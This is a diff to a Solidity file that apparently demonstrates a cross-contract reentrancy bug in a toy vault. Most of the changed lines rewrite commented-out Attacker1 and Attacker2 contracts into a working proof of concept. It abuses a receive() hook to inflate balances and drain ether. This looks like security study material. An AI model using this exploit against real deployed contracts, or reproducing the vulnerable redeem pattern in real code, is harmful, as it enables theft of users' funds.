@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-contract C {
+contract C_ree {
     Vault public immutable vault;
     bool private locked = false;
 
@@ -12,7 +12,7 @@ contract C {
         locked = false;
     }
 
-    constructor(address _vault) { vault = Vault(_vault); }
+    constructor(address _vault) payable { vault = Vault(_vault); }
 
     function redeem(address payable to) external nonReentrant {
         vault.setEnabled(true); 
@@ -68,22 +68,44 @@ contract Vault {
 }
 
 // contract Attacker1 {
-//     C c;
-//     address att2;
-//     Vault v;
-//     function attacker() public {
-//         c.redeem(payable(address(this)));
-//         Attacker2(att2).redeem();
+//     Vault public immutable vault;
+//     C_ree public immutable c;
+//     Attacker2 public att2;
+
+//     constructor(address _vault, address payable _c) payable {
+//         vault = Vault(_vault);
+//         c = C_ree(_c);
+//         att2 = new Attacker2(payable(address(this)), _c);
 //     }
+
+//     function attack() public {
+//         (bool success,) = address(c).call{value: 1 ether}("");
+//         require(success);
+//         c.redeem(payable(address(this)));
+//         att2.redeem();
+//     }
+
+//     function deposit() public payable {
+//     }
+
 //     receive() external payable {
-//         v.increase(att2, 1000);
+//         vault.increase(address(att2), 2 ether);
 //     }
 // }
 
 // contract Attacker2 {
-//     C c;
-//     Vault v;
+//     Attacker1 att1;
+//     C_ree c;
+
+//     constructor(address payable _att1, address payable _c) {
+//         att1 = Attacker1(_att1);
+//         c = C_ree(_c);
+//     }
+
 //     function redeem() external {
 //         c.redeem(payable(address(this)));
+//         att1.deposit{value: address(this).balance}();
 //     }
+
+//     receive() external payable {}
 // }
